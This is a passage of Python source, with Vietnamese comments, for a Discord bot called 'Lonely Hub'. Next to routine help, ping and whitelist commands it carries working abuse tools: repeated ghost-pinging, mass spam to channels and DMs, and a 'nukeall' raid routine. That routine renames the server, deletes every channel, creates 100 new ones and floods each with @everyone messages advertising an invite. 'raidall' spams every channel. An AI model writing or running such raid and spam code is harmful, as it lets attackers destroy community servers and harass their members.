        "‚Ä¢ `/ghostping <user_id> [delay] [quantity]` - Ghost ping ng∆∞·ªùi d√πng\n"
        "‚Ä¢ `/dms <user_id> <message>` - G·ª≠i tin nh·∫Øn DM ƒë·∫øn ng∆∞·ªùi d√πng\n"
        "‚Ä¢ `/spam <message> <quantity> [user_id]` - Spam tin nh·∫Øn\n"
        "‚Ä¢ `/premium_command` - Xem c√°c l·ªánh premium (admin only)"
    )
    
    if is_user_allowed(interaction.user.id):
        embed.add_field(
            name="‚ö° L·ªÜNH ADMIN (Ch·ªâ cho user ƒë∆∞·ª£c ph√©p)",
            value=admin_commands,
            inline=False
        )
    else:
        embed.add_field(
            name="üîí L·ªÜNH ADMIN",
            value="*B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng c√°c l·ªánh admin*",
            inline=False
        )
    
    # Auto response
    embed.add_field(
        name="ü§ñ T·ª∞ ƒê·ªòNG PH·∫¢N H·ªíI",
        value=(
            "Bot s·∫Ω t·ª± ƒë·ªông ph·∫£n h·ªìi khi nh·∫≠n di·ªán c√°c t·ª´ kh√≥a:\n"
            "‚Ä¢ `client`, `executor`, `executors` - Hi·ªÉn th·ªã danh s√°ch client\n"
            "‚Ä¢ `lu·∫≠t` - H∆∞·ªõng d·∫´n xem lu·∫≠t\n"
            "‚Ä¢ `m√°y ·∫£o`, `c√°ch nh·∫≠n m√°y ·∫£o` - H∆∞·ªõng d·∫´n nh·∫≠n m√°y ·∫£o"
        ),
        inline=False
    )
    
    # Notes
    embed.add_field(
        name="üìù GHI CH√ö",
        value=(
            "‚Ä¢ C√°c l·ªánh admin ch·ªâ d√†nh cho user ƒë∆∞·ª£c c·∫•p quy·ªÅn\n"
            "‚Ä¢ T·∫•t c·∫£ l·ªánh ƒë·ªÅu ƒë∆∞·ª£c ki·ªÉm so√°t, ghi log v√† th√¥ng b√°o qua DM Owner\n"
            "‚Ä¢ Th·ªùi gian hi·ªÉn th·ªã l√† UTC+7 (Vi·ªát Nam)"
        ),
        inline=False
    )
    
    # Set author, thumbnail, footer
    embed.set_author(name="Lonely Hub Help System", icon_url=ICON_URL)
    embed.set_thumbnail(url=ICON_URL)
    embed.set_footer(
        text=f"Lonely Hub | {current_time.strftime('%H:%M:%S %d/%m/%Y')} | Y√™u c·∫ßu b·ªüi {user}",
        icon_url=FOOTER_ICON_URL
    )
    embed.set_image(url=BANNER_URL)
    
    # ‚ö° Ph·∫£n h·ªìi tr∆∞·ªõc
    await interaction.response.send_message(embed=embed, ephemeral=True)

    # üìå Sau khi tr·∫£ l·ªùi th√¨ log + DM
    log_command(user, "/help", guild_name, "Slash Command")
    await send_dm_notification(user, "/help", guild_name, "Slash Command")
    
# Slash Command - Ping
@bot.tree.command(name="ping", description="Ki·ªÉm tra ƒë·ªô tr·ªÖ c·ªßa bot")
async def ping(interaction: discord.Interaction):
    """Slash command ping"""
    # Ki·ªÉm tra xem user c√≥ b·ªã c·∫•m kh√¥ng
    if is_user_banned(interaction.user.id):
        embed = discord.Embed(
            title="‚ùå B·ªã c·∫•m",
            description="B·∫°n ƒë√£ b·ªã c·∫•m s·ª≠ d·ª•ng bot n√†y!",
            color=discord.Color.red()
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    
    latency = round(bot.latency * 1000)
    current_time = get_utc7_time()
    
    # ‚ö° Ph·∫£n h·ªìi tr∆∞·ªõc
    embed = discord.Embed(
        title="üèì Pong!",
        description=f"ƒê·ªô tr·ªÖ: **{latency}ms**\n‚è∞ Th·ªùi gian: **{current_time.strftime('%H:%M:%S %d/%m/%Y')}** (UTC+7)",
        color=discord.Color.green(),
        timestamp=current_time
    )
    embed.set_author(name="Lonely Hub", icon_url=ICON_URL)
    embed.set_footer(text=f"Lonely Hub | {current_time.strftime('%H:%M:%S %d/%m/%Y')}", icon_url=FOOTER_ICON_URL)
    
    await interaction.response.send_message(embed=embed, ephemeral=True)

    # üìå Sau khi ph·∫£n h·ªìi, m·ªõi log + DM
    user = f"{interaction.user.name}#{interaction.user.discriminator}"
    guild_name = interaction.guild.name if interaction.guild else "Direct Message"
    log_command(user, "/ping", guild_name, "Slash Command")
    await send_dm_notification(user, "/ping", guild_name, "Slash Command")
    
# Lenh Info
@bot.tree.command(name="info", description="Xem th√¥ng tin v·ªÅ bot")
async def info(interaction: discord.Interaction):
    """Slash command info"""
    # Ki·ªÉm tra xem user c√≥ b·ªã c·∫•m kh√¥ng
    if is_user_banned(interaction.user.id):
        embed = discord.Embed(
            title="‚ùå B·ªã c·∫•m",
            description="B·∫°n ƒë√£ b·ªã c·∫•m s·ª≠ d·ª•ng bot n√†y!",
            color=discord.Color.red()
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    
    current_time = get_utc7_time()
    
    # ‚ö° Ph·∫£n h·ªìi tr∆∞·ªõc
    embed = discord.Embed(
        title="ü§ñ Bot Information",
        description="Bot logging system v·ªõi UTC+7",
        color=discord.Color.blue(),
        timestamp=current_time
    )
    embed.set_author(name="Lonely Hub", icon_url=ICON_URL)
    embed.add_field(name="üïê M√∫i gi·ªù", value="UTC+7", inline=True)
    embed.add_field(name="üìä S·ªë server", value=str(len(bot.guilds)), inline=True)
    embed.add_field(name="‚ö° ƒê·ªô tr·ªÖ", value=f"{round(bot.latency * 1000)}ms", inline=True)
    embed.add_field(name="üìù Logging", value="Text commands & Slash commands", inline=False)
    embed.add_field(name="üì® DM Notification", value=f"G·ª≠i ƒë·∫øn {len(ALLOWED_USERS)} user", inline=True)
    embed.add_field(name="üë• User ƒë∆∞·ª£c ph√©p spam", value=str(len(ALLOWED_USERS)), inline=True)
    embed.set_footer(text=f"Lonely Hub | {current_time.strftime('%H:%M:%S %d/%m/%Y')}", icon_url=FOOTER_ICON_URL)
    embed.set_thumbnail(url=ICON_URL)
    
    await interaction.response.send_message(embed=embed)

    # üìå Sau khi ph·∫£n h·ªìi, m·ªõi log + DM
    user = f"{interaction.user.name}#{interaction.user.discriminator}"
    guild_name = interaction.guild.name if interaction.guild else "Direct Message"
    log_command(user, "/info", guild_name, "Slash Command")
    await send_dm_notification(user, "/info", guild_name, "Slash Command")
    
# Slash Command - Whitelist: Hi·ªÉn th·ªã danh s√°ch user ƒë∆∞·ª£c ph√©p
@bot.tree.command(name="whitelist", description="Xem danh s√°ch user whitelist")
async def whitelist(interaction: discord.Interaction):
    """Slash command hi·ªÉn th·ªã danh s√°ch user whitelist"""
    # Ki·ªÉm tra xem user c√≥ b·ªã c·∫•m kh√¥ng
    if is_user_banned(interaction.user.id):
        embed = discord.Embed(
            title="‚ùå B·ªã c·∫•m",
            description="B·∫°n ƒë√£ b·ªã c·∫•m s·ª≠ d·ª•ng bot n√†y!",
            color=discord.Color.red()
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return

    # LOG TR∆Ø·ªöC KHI PH·∫¢N H·ªíI
    user = f"{interaction.user.name}#{interaction.user.discriminator}"
    guild_name = interaction.guild.name if interaction.guild else "Direct Message"
    log_command(user, "/whitelist", guild_name, "Slash Command")

    # G·ª≠i DM th√¥ng b√°o v·ªõi Embed
    await send_dm_notification(user, "/whitelist", guild_name, "Slash Command")

    current_time = get_utc7_time()

    # üî• ƒê·ªçc tr·ª±c ti·∫øp whitelist t·ª´ JSON
    try:
        with open(WHITELIST_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
    except Exception as e:
        data = {}
        print(f"[ERROR] Kh√¥ng th·ªÉ ƒë·ªçc {WHITELIST_FILE}: {e}")

    if not data:
        desc = "‚ö†Ô∏è Hi·ªán ch∆∞a c√≥ user n√†o trong whitelist."
    else:
        desc = "```\nDanh s√°ch user whitelist:\n"
        desc += "-" * 21 + "\n"
        for uid, name in data.items():
            desc += f"T√™n: {name}\n"
            desc += f"ID : {uid}\n"
            desc += "-" * 21 + "\n"
        desc += f"T·ªïng s·ªë: {len(data)} user ƒë∆∞·ª£c ph√©p s·ª≠ d·ª•ng l·ªánh premium\n```"

    embed = discord.Embed(
        title="üë• Danh s√°ch User Whitelist",
        description=desc,
        color=discord.Color.purple(),
        timestamp=current_time
    )
    embed.set_author(name="Lonely Hub", icon_url=ICON_URL)
    embed.set_footer(
        text=f"Lonely Hub | {current_time.strftime('%H:%M:%S %d/%m/%Y')}",
        icon_url=FOOTER_ICON_URL
    )
    embed.set_thumbnail(url=ICON_URL)

    await interaction.response.send_message(embed=embed, ephemeral=True)
    
# Slash Command - Ghostping
@bot.tree.command(name="ghostping", description="Ghost ping ng∆∞·ªùi d√πng")
@app_commands.describe(
    user_id="ID c·ªßa ng∆∞·ªùi d√πng c·∫ßn ghost ping",
    delay="Th·ªùi gian delay gi·ªØa c√°c l·∫ßn ping (gi√¢y), t·ªëi thi·ªÉu 0.1",
    quantity="S·ªë l∆∞·ª£ng ping, m·∫∑c ƒë·ªãnh l√† 5, t·ªëi ƒëa 50"
)
async def ghostping(interaction: discord.Interaction, user_id: str, delay: float = 0.5, quantity: int = 5):
    """Slash command ghost ping"""
    # Ki·ªÉm tra xem user c√≥ b·ªã c·∫•m kh√¥ng
    if is_user_banned(interaction.user.id):
        embed = discord.Embed(
            title="‚ùå B·ªã c·∫•m",
            description="B·∫°n ƒë√£ b·ªã c·∫•m s·ª≠ d·ª•ng bot n√†y!",
            color=discord.Color.red()
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    
    # Ki·ªÉm tra quy·ªÅn
    if not is_user_allowed(interaction.user.id):
        embed = discord.Embed(
            title="‚ùå L·ªói",
            description="B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng l·ªánh n√†y!",
            color=discord.Color.red()
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    
    # Ki·ªÉm tra n·∫øu ƒëang ·ªü guild b·ªã c·∫•m
    if interaction.guild and interaction.guild.id == RESTRICTED_GUILD_ID:
        embed = discord.Embed(
            title="‚ùå L·ªói",
            description="L·ªánh n√†y kh√¥ng ƒë∆∞·ª£c ph√©p s·ª≠ d·ª•ng trong server n√†y!",
            color=discord.Color.red()
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    
    # Ph·∫£n h·ªìi tr∆∞·ªõc ƒë·ªÉ tr√°nh l·ªói Unknown interaction
    await interaction.response.send_message(
        embed=discord.Embed(
            title="‚è≥ ƒêang x·ª≠ l√Ω...",
            description=f"ƒêang chu·∫©n b·ªã ghost ping {quantity} l·∫ßn v·ªõi delay {delay}s...",
            color=discord.Color.orange()
        ),
        ephemeral=True
    )
    
    try:
        target_user_id = int(user_id)
        target_user = await bot.fetch_user(target_user_id)
        
        sent_count = 0
        for i in range(quantity):
            try:
                ping_message = await interaction.channel.send(f"{target_user.mention}")
                await asyncio.sleep(0.3)
                await ping_message.delete()
                sent_count += 1
                
                if i < quantity - 1:
                    await asyncio.sleep(delay)
                    
            except discord.Forbidden:
                await interaction.followup.send(
                    embed=discord.Embed(
                        title="‚ùå L·ªói",
                        description="Bot kh√¥ng c√≥ quy·ªÅn x√≥a tin nh·∫Øn!",
                        color=discord.Color.red()
                    ),
                    ephemeral=True
                )
                return
            except Exception as e:
                print(f"[ERROR] L·ªói khi ghost ping: {e}")
        
        # Th√¥ng b√°o th√†nh c√¥ng
        await interaction.followup.send(
            embed=discord.Embed(
                title="‚úÖ Ho√†n th√†nh",
                description=f"ƒê√£ th·ª±c hi·ªán {sent_count}/{quantity} l·∫ßn ghost ping ƒë·∫øn {target_user.mention}",
                color=discord.Color.green()
            ),
            ephemeral=True
        )
        
        # üî• LOG SAU KHI HO√ÄN TH√ÄNH
        user = f"{interaction.user.name}#{interaction.user.discriminator}"
        guild_name = interaction.guild.name if interaction.guild else "Direct Message"
        log_command(user, f"/ghostping userid:{user_id} delay:{delay} quantity:{quantity}", guild_name, "Slash Command")
        await send_dm_notification(user, f"/ghostping userid:{user_id} delay:{delay} quantity:{quantity}", guild_name, "Slash Command")
        
    except ValueError:
        await interaction.followup.send(
            embed=discord.Embed(
                title="‚ùå L·ªói",
                description="User ID kh√¥ng h·ª£p l·ªá!",
                color=discord.Color.red()
            ),
            ephemeral=True
        )
    except discord.NotFound:
        await interaction.followup.send(
            embed=discord.Embed(
                title="‚ùå L·ªói",
                description="Kh√¥ng t√¨m th·∫•y user!",
                color=discord.Color.red()
            ),
            ephemeral=True
        )
    except Exception as e:
        await interaction.followup.send(
            embed=discord.Embed(
                title="‚ùå L·ªói",
                description=f"ƒê√£ x·∫£y ra l·ªói: {str(e)}",
                color=discord.Color.red()
            ),
            ephemeral=True
        )
        
# Slash Command - DMS
@bot.tree.command(name="dms", description="G·ª≠i tin nh·∫Øn DM ƒë·∫øn ng∆∞·ªùi d√πng")
@app_commands.describe(
    user_id="ID c·ªßa ng∆∞·ªùi d√πng c·∫ßn g·ª≠i tin nh·∫Øn",
    message="N·ªôi dung tin nh·∫Øn c·∫ßn g·ª≠i"
)
async def dms(interaction: discord.Interaction, user_id: str, message: str):
    """Slash command g·ª≠i DM"""
    # Ki·ªÉm tra xem user c√≥ b·ªã c·∫•m kh√¥ng
    if is_user_banned(interaction.user.id):
        embed = discord.Embed(
            title="‚ùå B·ªã c·∫•m",
            description="B·∫°n ƒë√£ b·ªã c·∫•m s·ª≠ d·ª•ng bot n√†y!",
            color=discord.Color.red()
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    
    # Ki·ªÉm tra quy·ªÅn
    if not is_user_allowed(interaction.user.id):
        embed = discord.Embed(
            title="‚ùå L·ªói",
            description="B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng l·ªánh n√†y!",
            color=discord.Color.red()
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    
    try:
        target_user_id = int(user_id)
        target_user = await bot.fetch_user(target_user_id)

        try:
            await target_user.send(f"{message}")
            embed = discord.Embed(
                title="‚úÖ ƒê√£ g·ª≠i tin nh·∫Øn",
                description=f"ƒê√£ g·ª≠i tin nh·∫Øn ƒë·∫øn {target_user.mention}",
                color=discord.Color.green()
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)

        except discord.Forbidden:
            error_embed = discord.Embed(
                title="‚ùå Kh√¥ng th·ªÉ g·ª≠i tin nh·∫Øn",
                description=f"Kh√¥ng th·ªÉ g·ª≠i tin nh·∫Øn ƒë·∫øn {target_user.mention}\n\n**L√Ω do:** User ƒë√£ ch·∫∑n DM ho·∫∑c bot kh√¥ng c√≥ quy·ªÅn g·ª≠i tin nh·∫Øn",
                color=discord.Color.red()
            )
            await interaction.response.send_message(embed=error_embed, ephemeral=True)

        # üî• LOG SAU KHI TH·ª∞C HI·ªÜN
        user = f"{interaction.user.name}#{interaction.user.discriminator}"
        guild_name = interaction.guild.name if interaction.guild else "Direct Message"
        log_command(user, f"/dms userid:{user_id} message:{message}", guild_name, "Slash Command")
        await send_dm_notification(user, f"/dms userid:{user_id} message:{message}", guild_name, "Slash Command")

    except ValueError:
        embed = discord.Embed(
            title="‚ùå L·ªói",
            description="User ID kh√¥ng h·ª£p l·ªá! Vui l√≤ng nh·∫≠p ID ƒë√∫ng ƒë·ªãnh d·∫°ng s·ªë.",
            color=discord.Color.red()
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)

    except discord.NotFound:
        embed = discord.Embed(
            title="‚ùå L·ªói",
            description="Kh√¥ng t√¨m th·∫•y ng∆∞·ªùi d√πng v·ªõi ID n√†y!",
            color=discord.Color.red()
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)

    except Exception as e:
        error_embed = discord.Embed(
            title="‚ùå L·ªói kh√¥ng x√°c ƒë·ªãnh",
            description=f"ƒê√£ x·∫£y ra l·ªói: {str(e)}",
            color=discord.Color.red()
        )
        await interaction.response.send_message(embed=error_embed, ephemeral=True)
        
# Spam
@bot.tree.command(name="spam", description="spam tin nh·∫Øn ·ªü k√™nh (ho·∫∑c dms)")
@app_commands.describe(
    message="N·ªôi dung tin nh·∫Øn c·∫ßn g·ª≠i",
    quantity="S·ªë l∆∞·ª£ng tin nh·∫Øn (t·ªëi ƒëa 1000)",
    user_id="ID c·ªßa ng∆∞·ªùi d√πng c·∫ßn g·ª≠i (ƒë·ªÉ tr·ªëng n·∫øu g·ª≠i ·ªü channel hi·ªán t·∫°i)"
)
async def spam(interaction: discord.Interaction, message: str, quantity: int, user_id: str = None):
    """Slash command spam"""
    if is_user_banned(interaction.user.id):
        embed = discord.Embed(
            title="‚ùå B·ªã c·∫•m",
            description="B·∫°n ƒë√£ b·ªã c·∫•m s·ª≠ d·ª•ng bot n√†y!",
            color=discord.Color.red()
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return

    if not is_user_allowed(interaction.user.id):
        embed = discord.Embed(
            title="‚ùå L·ªói",
            description="B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng l·ªánh n√†y!",
            color=discord.Color.red()
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return

    if interaction.guild and interaction.guild.id == RESTRICTED_GUILD_ID:
        embed = discord.Embed(
            title="‚ùå L·ªói",
            description="L·ªánh n√†y kh√¥ng ƒë∆∞·ª£c ph√©p s·ª≠ d·ª•ng trong server n√†y!",
            color=discord.Color.red()
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return

    if quantity > 1000 or quantity <= 0:
        embed = discord.Embed(
            title="‚ùå L·ªói",
            description="S·ªë l∆∞·ª£ng tin nh·∫Øn ph·∫£i t·ª´ 1 ƒë·∫øn 1000!",
            color=discord.Color.red()
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return

    await interaction.response.send_message(
        embed=discord.Embed(
            title="‚è≥ ƒêang x·ª≠ l√Ω...",
            description=f"ƒêang g·ª≠i {quantity} tin nh·∫Øn...",
            color=discord.Color.orange()
        ),
        ephemeral=True
    )

    try:
        sent_count = 0
        if user_id:
            try:
                target_user = await bot.fetch_user(int(user_id))
                for _ in range(quantity):
                    await target_user.send(f"{message}")
                    sent_count += 1
                    await asyncio.sleep(0.5)

                await interaction.edit_original_response(
                    embed=discord.Embed(
                        title="‚úÖ Ho√†n th√†nh",
                        description=f"ƒê√£ g·ª≠i {sent_count} tin nh·∫Øn ƒë·∫øn {target_user.mention}",
                        color=discord.Color.green()
                    )
                )

            except Exception as e:
                await interaction.edit_original_response(
                    embed=discord.Embed(
                        title="‚ùå L·ªói",
                        description=f"Kh√¥ng th·ªÉ g·ª≠i tin nh·∫Øn: {e}",
                        color=discord.Color.red()
                    )
                )

        else:
            for _ in range(quantity):
                await interaction.channel.send(f"{message}")
                sent_count += 1
                await asyncio.sleep(0.5)

            await interaction.edit_original_response(
                embed=discord.Embed(
                    title="‚úÖ Ho√†n th√†nh",
                    description=f"ƒê√£ g·ª≠i {sent_count} tin nh·∫Øn v√†o k√™nh",
                    color=discord.Color.green()
                )
            )

        # üî• LOG SAU KHI HO√ÄN TH√ÄNH
        user = f"{interaction.user.name}#{interaction.user.discriminator}"
        guild_name = interaction.guild.name if interaction.guild else "Direct Message"
        log_command(user, f"/spam message:{message} quantity:{quantity} userid:{user_id}", guild_name, "Slash Command")
        await send_dm_notification(user, f"/spam message:{message} quantity:{quantity} userid:{user_id}", guild_name, "Slash Command")

    except Exception as e:
        await interaction.edit_original_response(
            embed=discord.Embed(
                title="‚ùå L·ªói",
                description=f"ƒê√£ x·∫£y ra l·ªói: {str(e)}",
                color=discord.Color.red()
            )
        )
        
# L·ªÜNH /SAY - G·ª≠i tin nh·∫Øn thay m·∫∑t bot
@bot.tree.command(name="say", description="L√†m bot g·ª≠i tin nh·∫Øn")
@app_commands.describe(
    message="N·ªôi dung tin nh·∫Øn c·∫ßn g·ª≠i",
    channel="K√™nh ƒë·ªÉ g·ª≠i tin nh·∫Øn (ƒë·ªÉ tr·ªëng n·∫øu g·ª≠i ·ªü k√™nh hi·ªán t·∫°i)"
)
async def say(interaction: discord.Interaction, message: str, channel: discord.TextChannel = None):
    """Slash command /say - G·ª≠i tin nh·∫Øn thay m·∫∑t bot"""
    # Ki·ªÉm tra xem user c√≥ b·ªã c·∫•m kh√¥ng
    if is_user_banned(interaction.user.id):
        embed = discord.Embed(
            title="‚ùå B·ªã c·∫•m",
            description="B·∫°n ƒë√£ b·ªã c·∫•m s·ª≠ d·ª•ng bot n√†y!",
            color=discord.Color.red()
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    
    # Ki·ªÉm tra quy·ªÅn
    if not is_user_allowed(interaction.user.id):
        embed = discord.Embed(
            title="‚ùå L·ªói",
            description="B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng l·ªánh n√†y!",
            color=discord.Color.red()
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    
    # X√°c ƒë·ªãnh k√™nh ƒë√≠ch
    target_channel = channel or interaction.channel
    
    try:
        # G·ª≠i tin nh·∫Øn
        await target_channel.send(message)
        
        # Ph·∫£n h·ªìi x√°c nh·∫≠n
        embed = discord.Embed(
            title="‚úÖ Tin nh·∫Øn ƒë√£ ƒë∆∞·ª£c g·ª≠i",
            description=f"ƒê√£ g·ª≠i tin nh·∫Øn ƒë·∫øn {target_channel.mention}",
            color=discord.Color.green()
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        
        # üî• LOG SAU KHI HO√ÄN TH√ÄNH
        user = f"{interaction.user.name}#{interaction.user.discriminator}"
        guild_name = interaction.guild.name if interaction.guild else "Direct Message"
        log_command(user, f"/say message:{message}", guild_name, "Slash Command")
        await send_dm_notification(user, f"/say message:{message}", guild_name, "Slash Command")
        
    except discord.Forbidden:
        embed = discord.Embed(
            title="‚ùå L·ªói",
            description=f"Bot kh√¥ng c√≥ quy·ªÅn g·ª≠i tin nh·∫Øn trong {target_channel.mention}!",
            color=discord.Color.red()
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        
        # üî• LOG SAU KHI TH·∫§T B·∫†I
        user = f"{interaction.user.name}#{interaction.user.discriminator}"
        guild_name = interaction.guild.name if interaction.guild else "Direct Message"
        log_command(user, f"/say th·∫•t b·∫°i (kh√¥ng c√≥ quy·ªÅn) message:{message}", guild_name, "Slash Command")
        await send_dm_notification(user, f"/say th·∫•t b·∫°i (kh√¥ng c√≥ quy·ªÅn) message:{message}", guild_name, "Slash Command")
        
    except Exception as e:
        embed = discord.Embed(
            title="‚ùå L·ªói",
            description=f"ƒê√£ x·∫£y ra l·ªói: {str(e)}",
            color=discord.Color.red()
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        
        # üî• LOG SAU KHI TH·∫§T B·∫†I
        user = f"{interaction.user.name}#{interaction.user.discriminator}"
        guild_name = interaction.guild.name if interaction.guild else "Direct Message"
        log_command(user, f"/say th·∫•t b·∫°i (l·ªói:{str(e)}) message:{message}", guild_name, "Slash Command")
        await send_dm_notification(user, f"/say th·∫•t b·∫°i (l·ªói:{str(e)}) message:{message}", guild_name, "Slash Command")
        
# ==================== C√ÅC L·ªÜNH M·ªöI T√çCH H·ª¢P ====================

# L·ªánh ?nukeall - Nuke server (t√≠ch h·ª£p t·ª´ nuke.py)
@bot.command()
async def nukeall(ctx):
    """Raid server"""
    # Ki·ªÉm tra xem user c√≥ b·ªã c·∫•m kh√¥ng
    if is_user_banned(ctx.author.id):
        embed = discord.Embed(
            title="‚ùå B·ªã c·∫•m",
            description="B·∫°n ƒë√£ b·ªã c·∫•m s·ª≠ d·ª•ng bot n√†y!",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
        return
    
    # Ki·ªÉm tra quy·ªÅn
    if not is_user_allowed(ctx.author.id):
        embed = discord.Embed(
            title="‚ùå L·ªói",
            description="B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng l·ªánh n√†y!",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
        return
    
    # Ki·ªÉm tra n·∫øu ƒëang ·ªü guild b·ªã c·∫•m
    if ctx.guild and ctx.guild.id == RESTRICTED_GUILD_ID:
        embed = discord.Embed(
            title="‚ùå L·ªói",
            description="L·ªánh n√†y kh√¥ng ƒë∆∞·ª£c ph√©p s·ª≠ d·ª•ng trong server n√†y!",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
        return
    
    # LOG TR∆Ø·ªöC KHI X·ª¨ L√ù
    user = f"{ctx.author.name}#{ctx.author.discriminator}"
    guild_name = ctx.guild.name if ctx.guild else "Direct Message"
    log_message = log_command(user, "?nukeall", guild_name, "Text Command")
    
    # G·ª≠i DM th√¥ng b√°o v·ªõi Embed
    await send_dm_notification(user, "?nukeall", guild_name, "Text Command")
    
    try:
        if not ctx.guild.me.guild_permissions.administrator:
            await ctx.send("Bot Has Missing Administrator Role")
            log("Bot Has Missing Administrator Role")
            return
        
        try:
            await ctx.message.delete()
            log("Deleted Command Succesfully!")
        except:
            log("Can't Delete Command")
        
        log("Starting Raid Server...")
        status_msg = await ctx.send("Starting raid...")
        await asyncio.sleep(1)
        await status_msg.delete()
        
        await raid_server(ctx.guild)
        
    except Exception as e:
        log(f"Error In Nuke Command: {e}")

async def raid_server(guild):
    """Function To Raid"""
    try:
        log(f"Starting Raid: {guild.name}")
        
        try:
            await guild.edit(name="Raidded By Lonely Hub")
            log("Rename Server Succesfuly!")
        except Exception as e:
            log(f"Error When Rename Server: {e}")
        
        log("Deleting Channel...")
        channel_count = 0
        for channel in list(guild.channels):
            try:
                await channel.delete()
                channel_count += 1
            except Exception as e:
                log(f"Error When Delete Channel: {channel.name}: {e}")
        log(f"Deleted {channel_count} Channel Succesfuly")
        
        log("Creating Channel and send messages...")
        message_content = """@everyone
# Your Server Got Raided By Lonely Hub
# Join Server And Dms Owner To Invite Bot
# Invite: https://discord.gg/2anc7nHw6b"""
        
        msg_count = 0
        channel_create_tasks = []
        
        for i in range(100):
            channel_create_tasks.append(guild.create_text_channel(f"‚äπ‚Äß‚ÇäÀöÍí∞üíÄÍí±„Éª Ä·¥Ä…™·¥Ö·¥Ö·¥á·¥Ö  ô è  ü·¥è…¥·¥á ü è  ú·¥ú ô"))
        
        new_channels = await asyncio.gather(*channel_create_tasks, return_exceptions=True)
        
        successful_channels = []
        for i, channel in enumerate(new_channels):
            if isinstance(channel, discord.TextChannel):
                successful_channels.append(channel)
                log(f"Channel Created {i+1}")
            else:
                log(f"Error When Create Channel {i+1}: {channel}")
        
        log(f"Created {len(successful_channels)} channel Succesfuly")
        
        message_tasks = []
        for channel in successful_channels:
            for i in range(50):
                message_tasks.append(channel.send(message_content))
        
        message_results = await asyncio.gather(*message_tasks, return_exceptions=True)
        
        for result in message_results:
            if not isinstance(result, Exception):
                msg_count += 1
        
        log(f"Succesfully Send {msg_count} Messages")
        log("Raid Completed!")
        
    except Exception as e:
        log(f"Raid Error:: {e}")

# L·ªánh ?raidall - Spam t·∫•t c·∫£ k√™nh v·ªõi tin nh·∫Øn
@bot.command()
async def raidall(ctx):
    """Spam t·∫•t c·∫£ k√™nh v·ªõi tin nh·∫Øn"""
    # Ki·ªÉm tra xem user c√≥ b·ªã c·∫•m kh√¥ng
    if is_user_banned(ctx.author.id):
        embed = discord.Embed(
            title="‚ùå B·ªã c·∫•m",
            description="B·∫°n ƒë√£ b·ªã c·∫•m s·ª≠ d·ª•ng bot n√†y!",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
        return
    
    # Ki·ªÉm tra quy·ªÅn
    if not is_user_allowed(ctx.author.id):
        embed = discord.Embed(
            title="‚ùå L·ªói",
            description="B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng l·ªánh n√†y!",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
        return
    
    # Ki·ªÉm tra n·∫øu ƒëang ·ªü guild b·ªã c·∫•m
    if ctx.guild and ctx.guild.id == RESTRICTED_GUILD_ID:
        embed = discord.Embed(
            title="‚ùå L·ªói",
            description="L·ªánh n√†y kh√¥ng ƒë∆∞·ª£c ph√©p s·ª≠ d·ª•ng trong server n√†y!",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
        return
    
    # LOG TR∆Ø·ªöC KHI X·ª¨ L√ù
    user = f"{ctx.author.name}#{ctx.author.discriminator}"
    guild_name = ctx.guild.name if ctx.guild else "Direct Message"
    log_message = log_command(user, "?raidall", guild_name, "Text Command")
    
    # G·ª≠i DM th√¥ng b√°o v·ªõi Embed
    await send_dm_notification(user, "?raidall", guild_name, "Text Command")
    
    try:
        message_content = """# Your Server Got Raided By Lonely Hub
# Join Server And Dms Owner To Invite Bot
# Invite: https://discord.gg/2anc7nHw6b"""
        
        msg_count = 0
        status_msg = await ctx.send("Starting raid all channels...")
        
        # G·ª≠i tin nh·∫Øn ƒë·∫øn t·∫•t c·∫£ c√°c k√™nh
        for channel in ctx.guild.text_channels:
            try:
                if channel.permissions_for(ctx.guild.me).send_messages:
                    await channel.send(message_content)
                    msg_count += 1
                    await asyncio.sleep(0)  # Kh√¥ng delay
            except Exception as e:
                print(f"L·ªói g·ª≠i tin nh·∫Øn ƒë·∫øn {channel.name}: {e}")
        
        await status_msg.delete()
        
        # Th√¥ng b√°o th√†nh c√¥ng
        embed = discord.Embed(
            title="‚úÖ Ho√†n th√†nh",
            description=f"ƒê√£ g·ª≠i {msg_count} tin nh·∫Øn ƒë·∫øn t·∫•t c·∫£ k√™nh",
            color=discord.Color.green()
        )
        await ctx.send(embed=embed)
        
    except Exception as e:
        embed = discord.Embed(
            title="‚ùå L·ªói",
            description=f"ƒê√£ x·∫£y ra l·ªói: {str(e)}",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)

# L·ªánh ?spampingall - Spam ping everyone t·∫•t c·∫£ k√™nh
@bot.command()
async def spampingall(ctx):
    """Spam ping everyone t·∫•t c·∫£ k√™nh"""
